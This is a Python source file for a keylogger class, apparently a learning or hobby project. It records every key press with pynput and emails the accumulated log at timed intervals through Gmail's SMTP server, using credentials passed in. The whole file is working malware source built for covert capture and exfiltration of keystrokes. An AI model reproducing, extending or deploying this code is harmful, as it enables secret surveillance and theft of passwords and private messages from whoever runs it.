#!/usr/bin/env pyhton
import pynput
import pynput.keyboard
import threading
import smtplib


class Keylogger:

    def __init__(self, time_interval, email, password):
        self.log = "Keylogger Started"
        self.time = time_interval
        self.email = email
        self.password = password
        # self.start()

    def append_to_log(self, string):
        self.log = self.log + string

    def report(self):
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.time, self.report)  # Wait an call func
        timer.start()

    def record(self, key):
        try:
            # log = log + str(key.char)
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                # log = log + " "
                current_key = " "
            else:
                # log = log + " " +  str(key) + " "
                current_key = "  " + str(key) + " "
        self.append_to_log(current_key)

    def send_mail(sefl, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def start(self):
        keyboardListener = pynput.keyboard.Listener(on_press=self.record)  # Create listener
        with keyboardListener:
            self.report()
            keyboardListener.join()
